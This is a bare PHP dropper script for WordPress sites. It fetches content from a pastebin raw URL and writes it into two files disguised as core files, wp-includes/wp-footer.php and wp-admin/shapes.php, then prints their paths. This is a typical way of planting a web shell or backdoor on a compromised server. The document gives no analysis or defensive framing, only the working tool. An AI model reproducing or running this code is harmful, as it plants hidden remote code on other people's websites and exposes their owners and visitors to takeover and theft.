<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-footer.php" ;
$text = http_get('https://pastebin.com/raw/kMG1AhEW');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/shapes.php" ;
$text2 = http_get('https://pastebin.com/raw/kMG1AhEW');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits2";
echo "done2 .\n " ;


?>
